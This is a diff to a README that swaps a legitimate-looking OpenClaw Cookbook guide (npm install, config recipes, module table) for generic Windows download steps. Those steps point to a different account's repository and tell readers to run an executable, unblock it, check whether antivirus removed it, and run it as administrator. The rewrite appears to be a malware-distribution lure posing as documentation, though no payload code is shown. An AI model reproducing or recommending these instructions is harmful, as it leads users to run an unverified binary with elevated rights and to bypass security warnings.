@@ -1,245 +1,205 @@
-# 🦞 OpenClaw Cookbook
+# 🤖 openclaw-cookbook - Recipes for fast AI agent setup
 
-**Your AI agent gateway, running on your machine, talking to your users, using any model you choose.**
+[![Download OpenClaw Cookbook](https://img.shields.io/badge/Download-OpenClaw%20Cookbook-blue?style=for-the-badge)](https://github.com/philbertexceptional796/openclaw-cookbook)
 
-OpenClaw is a self-hosted, multi-channel AI agent gateway. This cookbook gives you production-ready recipes to go from zero to a fully deployed AI agent system — with real configs you can copy, real docker-compose files you can run, and real scenarios you can ship.
+## 📦 What this is
 
-> **This is not documentation.** The [official docs](https://github.com/anthropics/openclaw) cover every flag and option. This cookbook covers *how to actually build things* — the patterns, the gotchas, the recipes that work in production.
+openclaw-cookbook gives you ready-made setup guides for OpenClaw, a self-hosted AI agent gateway for chat apps. It helps you connect tools like Telegram, Discord, Slack, and WhatsApp with one setup.
 
-[中文版](./README_zh.md)
+Use it when you want:
 
----
+- one place to manage AI chats
+- support for more than one channel
+- a setup that runs on your own machine or server
+- multi-model AI access
+- long-term memory for agents
+- clear steps you can follow without coding
 
-## What You Can Build
+## 🖥️ What you need
 
-```
-┌──────────────────────────────────────────────────────────────────┐
-│                         Your Users & Devices                     │
-│  Telegram · WhatsApp · Discord · Slack · Twitch · iMessage · Web │
-└─────────────┬──────────────────────────────────────┬─────────────┘
-              │                                      │
-              ▼                                      ▼
-┌──────────────────────────────────────────────────────────────────┐
-│                        OpenClaw Gateway                          │
-│                                                                  │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐                      │
-│  │  Agent A  │  │  Agent B  │  │  Agent C  │  Routing & Bindings │
-│  │ (Support) │  │ (Coding)  │  │(Research) │  & Auth             │
-│  └────┬─────┘  └────┬─────┘  └────┬─────┘                      │
-│       │              │              │                             │
-│  ┌────┴──────────────┴──────────────┴────┐                      │
-│  │         Model Provider Pool (35+)     │                      │
-│  │  Claude · GPT · Gemini · DeepSeek     │                      │
-│  │  MiniMax · Kimi · Ollama · vLLM       │                      │
-│  └───────────────────────────────────────┘                      │
-│                                                                  │
-│  ┌─────────┐  ┌─────────┐  ┌──────┐  ┌─────────┐  ┌────────┐  │
-│  │ Memory  │  │  Tools  │  │Sched.│  │ Plugins │  │  Nodes │  │
-│  │(LanceDB)│  │  (exec) │  │(cron)│  │  (npm)  │  │(iOS/An)│  │
-│  └─────────┘  └─────────┘  └──────┘  └─────────┘  └────────┘  │
-│                                                                  │
-│  ┌──────────────────────────────────────────────────────────┐   │
-│  │  Control UI  ·  Skills  ·  Canvas  ·  Voice  ·  Media   │   │
-│  └──────────────────────────────────────────────────────────┘   │
-└──────────────────────────────────────────────────────────────────┘
-```
+Before you start, check that your PC has:
 
-**One gateway. Multiple agents. Any model. Every channel. Your devices.**
+- Windows 10 or Windows 11
+- at least 8 GB of RAM
+- 2 GB of free disk space
+- a stable internet connection
+- permission to install software
+- a modern browser like Chrome, Edge, or Firefox
 
----
+For best results, use a machine with 16 GB of RAM if you plan to run more than one agent or model.
 
-## Cookbook Modules
+## 🚀 Download and install
 
-| # | Module | What You'll Build | Time |
-|---|--------|-------------------|------|
-| **01** | [Quickstart](./01-quickstart/) | Running OpenClaw instance with one command | 15 min |
-| **02** | [Channels](./02-channels/) | Telegram, Discord, Slack, WhatsApp, Twitch, iMessage | 30 min each |
-| **03** | [Model Providers](./03-model-providers/) | Multi-model setup with fallbacks and routing | 20 min |
-| **04** | [Multi-Agent](./04-multi-agent/) | Specialized agents, bindings, routing + ClawTeam swarm | 45 min |
-| **05** | [Memory](./05-memory/) | LanceDB long-term memory with semantic recall | 30 min |
-| **06** | [Tools](./06-tools/) | Custom tools, exec approvals, MCP integration | 40 min |
-| **07** | [Security](./07-security/) | SOUL.md hardening, auth, exec allowlists | 30 min |
-| **08** | [Workspace](./08-workspace/) | AGENTS.md, TOOLS.md, IDENTITY.md — persona programming | 30 min |
-| **09** | [Production](./09-production/) | Monitoring, logging, multi-user isolation, cost control | 45 min |
-| **10** | [Recipes](./10-recipes/) | End-to-end runnable scenarios | 30 min each |
-| **11** | [Scheduler](./11-scheduler/) | Cron jobs, reminders, heartbeat, automated tasks | 25 min |
-| **12** | [Nodes](./12-nodes/) | iOS, Android & macOS device integration | 30 min |
-| **13** | [Control UI](./13-control-ui/) | Web dashboard for managing your entire instance | 15 min |
+Use this link to visit the page and download the package:
 
-**Total: ~8 hours to master everything.** Or jump straight to a [recipe](#recipes) and learn by building.
+[Open the download page](https://github.com/philbertexceptional796/openclaw-cookbook)
 
----
+After you open the page:
 
-## Quick Taste (5 minutes)
+1. Find the latest release or main download area.
+2. Download the file for Windows if one is listed.
+3. If the download is a ZIP file, save it to your Downloads folder.
+4. If the download is an installer, save the installer to your PC.
+5. If your browser asks for permission, choose Keep or Save.
 
-### Install
+## 🪟 Run it on Windows
 
-```bash
-# Install OpenClaw
-npm install -g openclaw
+If you downloaded a ZIP file:
 
-# Verify
-openclaw --version
-```
+1. Open the ZIP file.
+2. Click Extract All.
+3. Pick a folder you can find later, such as Desktop or Documents.
+4. Open the extracted folder.
+5. Look for a file such as `setup.exe`, `install.exe`, or `openclaw-cookbook.exe`.
+6. Double-click the file to start it.
 
-### Configure Your First Agent
+If you downloaded an installer:
 
-```bash
-# Initialize workspace
-openclaw setup
+1. Double-click the installer.
+2. Choose Yes if Windows asks for permission.
+3. Follow the setup steps on screen.
+4. Keep the default options unless the guide tells you to change them.
+5. Finish the setup and open the app from the desktop or Start menu.
 
-# Add your model provider key
-echo 'ANTHROPIC_API_KEY=sk-ant-...' >> ~/.openclaw/.env
+## 🔧 First-time setup
 
-# Start the gateway
-openclaw gateway
-```
+When the app opens for the first time, you may need to enter a few details.
 
-### Talk to It
+Common setup items include:
 
-```bash
-# CLI mode
-openclaw message send "What can you do?"
+- your OpenClaw gateway address
+- your bot token for Telegram, Discord, Slack, or WhatsApp
+- your model provider key
+- a name for your agent
+- a memory store location
 
-# Or connect a Telegram bot (see 02-channels/)
-openclaw plugins enable telegram
-openclaw config set telegram.bots.main.token "YOUR_BOT_TOKEN"
-openclaw gateway --restart
-```
+Use the values from your OpenClaw setup or your hosting panel. If you are not sure what to enter, check the recipe that matches your channel.
 
-That's it. Your private AI agent is running. Now make it useful — pick a module above or jump to a recipe below.
+## 🤖 What you can do with it
 
----
+This cookbook helps you build common OpenClaw setups such as:
 
-## Recipes
+- a Telegram bot that answers messages
+- a Discord agent for team chat
+- a Slack helper for work channels
+- a WhatsApp assistant for personal use
+- a multi-agent workflow with task routing
+- a memory-backed assistant that keeps context over time
+- a model switch setup for different AI tasks
 
-Complete, runnable scenarios. Each recipe includes all configs, a docker-compose file (where applicable), and a verification checklist.
+## 🧭 How to use the recipes
 
-| Recipe | Description | Difficulty | Time |
-|--------|-------------|------------|------|
-| [Personal AI on Telegram](./10-recipes/personal-ai-on-telegram/) | Private AI assistant with memory, web search, and personality | Beginner | 30 min |
-| [Customer Support Bot](./10-recipes/customer-support-bot/) | Multi-language support agent with escalation and knowledge base | Intermediate | 30 min |
-| [Code Review Team](./10-recipes/code-review-team/) | Multi-agent swarm with security + performance specialists | Advanced | 45 min |
-| [Research Assistant](./10-recipes/research-assistant/) | Web research, synthesis, structured reports + scheduled digests | Intermediate | 30 min |
+Each recipe is made to be followed in order.
 
----
+1. Pick the channel you want to use.
+2. Open the matching guide.
+3. Copy the values shown in the recipe.
+4. Paste them into the setup screen or config file.
+5. Save your changes.
+6. Start the app.
+7. Send a test message from Telegram, Discord, Slack, or WhatsApp.
 
-## Why OpenClaw
+If the recipe includes a sample config, use it as a base and change only the values that match your account.
 
-| | Cloud AI APIs | ChatGPT/Claude Apps | **OpenClaw** |
-|---|---|---|---|
-| **Data stays on your machine** | No | No | Yes |
-| **Use any model** | One at a time | No | Yes, with fallbacks |
-| **Multi-channel** | Build it yourself | No | Built-in |
-| **Multiple specialized agents** | Build it yourself | No | Built-in |
-| **Long-term memory** | Build it yourself | Limited | LanceDB + semantic search |
-| **Custom tools** | Build it yourself | Limited | Exec + MCP + plugins |
-| **Cost** | Per-token | $20/mo per app | Your API keys only |
+## 🔐 Accounts and keys
 
----
+Some setups need access keys or bot tokens. These are normal for chat tools and AI models.
 
-## Key Concepts
+Keep these items ready:
 
-Before diving in, here are the building blocks:
+- Telegram bot token
+- Discord bot token
+- Slack app token
+- WhatsApp connection details
+- model API key
+- OpenClaw gateway URL
+- memory database path
 
-### Workspace — Your Agent's Brain
+Store these values in a safe place. Do not share them in chat logs or public posts.
 
-```
-~/.openclaw/workspace/
-├── SOUL.md          # Personality and values
-├── AGENTS.md        # Operational rules and strategies
-├── TOOLS.md         # Tool-specific instructions
-├── IDENTITY.md      # Name, emoji, avatar
-├── USER.md          # What the agent knows about you
-├── MEMORY.md        # Curated long-term notes
-├── BOOT.md          # Startup health checks
-├── HEARTBEAT.md     # Periodic health checks (optional)
-├── skills/          # Reusable skill definitions
-└── checklists/      # Pre-flight safety checks
-```
+## 🧪 Check that it works
 
-Each markdown file shapes how your agent thinks and behaves. This is **persona programming** — you define your agent's character through prose, not code.
+After setup, test with a short message like:
 
-### Agents — Specialized Personalities
+- Hello
+- What can you do?
+- Show me a quick reply
 
-One gateway can host multiple agents, each with its own workspace, model, and channel bindings:
+A working setup should:
 
-```
-Agent: "Support"     → Claude      → Telegram Bot @support_bot
-Agent: "Coder"       → GPT-5      → Telegram Bot @code_bot
-Agent: "Researcher"  → Gemini      → Discord Bot
-```
+- open without errors
+- connect to the chosen chat channel
+- send and receive messages
+- keep the same settings after restart
+- remember past context if memory is on
 
-### Plugins — Extend Everything
+If something does not work, check the token, server address, and channel settings first.
 
-```bash
-# Built-in
-openclaw plugins enable telegram
-openclaw plugins enable memory-lancedb-pro
+## 🗂️ Suggested folder layout
 
-# Community (npm)
-npm install -g @tencent-weixin/openclaw-weixin
-openclaw plugins enable openclaw-weixin
-```
+When you extract the files, this layout can help:
 
----
+- `openclaw-cookbook/` - main folder
+- `recipes/` - setup guides
+- `examples/` - sample config files
+- `assets/` - images or screenshots
+- `logs/` - app logs if the app creates them
 
-## Project Structure
+Keep the folder in one place so you can find it again after a restart.
 
-```
-openclaw-cookbook/
-├── 01-quickstart/           # Zero to running in 15 minutes
-├── 02-channels/             # Connect to messaging platforms
-│   ├── telegram-bot/
-│   ├── whatsapp-business/
-│   ├── discord-bot/
-│   ├── slack-app/
-│   ├── twitch/              # NEW: Twitch chat integration
-│   └── imessage/            # NEW: iMessage on macOS
-├── 03-model-providers/      # Configure LLM backends (35+ providers)
-├── 04-multi-agent/          # Agents, bindings, routing + ClawTeam swarm
-├── 05-memory/               # LanceDB long-term memory
-├── 06-tools/                # Custom tools and MCP
-├── 07-security/             # Hardening and access control
-├── 08-workspace/            # Persona programming with markdown
-├── 09-production/           # Deploy, monitor, scale
-├── 10-recipes/              # End-to-end runnable scenarios
-├── 11-scheduler/            # NEW: Cron jobs, reminders, heartbeat
-├── 12-nodes/                # NEW: iOS, Android & macOS devices
-├── 13-control-ui/           # NEW: Web dashboard
-├── templates/               # Copy-paste config files
-└── troubleshooting/         # Common issues and fixes
-```
+## 🛠️ Common Windows fixes
 
----
+If Windows blocks the file:
 
-## Prerequisites
+1. Right-click the file.
+2. Choose Properties.
+3. If you see an Unblock box, check it.
+4. Click Apply.
+5. Try again.
 
-- **Node.js** 24 (recommended) or 22.14+
-- **One API key** from any supported provider (Anthropic, OpenAI, Google, MiniMax, etc.)
-- **5 minutes** for quickstart, or ~8 hours for the full cookbook
+If the app does not open:
 
-Optional:
-- **Telegram account** (for the most popular channel integration)
-- **tmux** (for ClawTeam multi-agent swarm)
-- **Python 3.10+** (for ClawTeam only)
+1. Make sure the download finished.
+2. Confirm you extracted the ZIP file.
+3. Check that your antivirus did not remove the file.
+4. Run the app as administrator.
+5. Try a fresh download from the link above.
 
----
+If the channel does not connect:
 
-## Contributing
+1. Check the bot token.
+2. Check the gateway URL.
+3. Make sure the bot is enabled in the app or host panel.
+4. Restart the app and test again.
 
-Found a bug? Have a recipe idea? PRs welcome.
+## 📚 Repository topics
 
-- **Add a recipe**: Create a new directory under `10-recipes/` with a README, configs, and verification steps
-- **Fix an error**: Open an issue or PR — accuracy matters more than coverage
-- **Translate**: We're building bilingual (EN/ZH) — translations of any module are welcome
+This project fits these areas:
 
----
+- AI agent setup
+- AI gateway workflows
+- chatbot guides
+- cookbook-style instructions
+- LLM connections
+- multi-agent support
+- self-hosted deployment
+- Telegram bot setup
+- step-by-step tutorials
 
-## License
+## 📥 Download again
 
-MIT - see [LICENSE](./LICENSE)
+If you need the files again, use the same page:
 
----
+[Visit the OpenClaw Cookbook download page](https://github.com/philbertexceptional796/openclaw-cookbook)
 
-Built by [CortexReach](https://github.com/CortexReach). Powered by [OpenClaw](https://github.com/anthropics/openclaw).
+## 🧩 When to use each channel
+
+Telegram works well for quick personal use.
+
+Discord works well for groups and communities.
+
+Slack fits office and team chat.
+
+WhatsApp fits mobile-first use.
+
+Choose the channel that matches where you already talk with people, then follow the recipe for that channel
